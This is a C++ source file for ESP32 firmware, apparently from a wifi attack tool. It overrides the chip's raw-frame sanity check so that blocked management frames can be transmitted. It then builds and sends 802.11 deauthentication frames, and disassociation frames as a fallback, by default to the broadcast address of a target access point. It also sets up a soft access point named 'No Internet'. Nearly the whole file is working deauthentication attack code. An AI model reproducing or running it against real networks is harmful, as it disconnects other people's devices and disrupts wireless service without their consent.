#include "utils/WifiAttackUtil.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  return 0;
}

WifiAttackUtil::WifiAttackUtil()
{
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP("No Internet", "12345678", 1, true);
}

WifiAttackUtil::~WifiAttackUtil()
{
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  _sequenceNumber = 0;
}

esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
{
  if (_currentChannel == channel) return ESP_OK;
  _currentChannel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_sendPacket(const uint8_t* packet, const size_t len) noexcept
{
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr bssid, const uint8_t channel)
{
  const MacAddr broadcast = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return deauthenticate(broadcast, bssid, channel);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  memcpy(_deauthFrame, _deauthDefault, sizeof(_deauthDefault));
  memcpy(&_deauthFrame[4],  ap,    6);
  memcpy(&_deauthFrame[10], bssid, 6);
  memcpy(&_deauthFrame[16], bssid, 6);
  memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
  _sequenceNumber++;

  res = _sendPacket(_deauthFrame, sizeof(_deauthFrame));
  if (res == ESP_OK) return ESP_OK;
  _deauthFrame[0] = 0xa0;
  return _sendPacket(_deauthFrame, sizeof(_deauthFrame));
}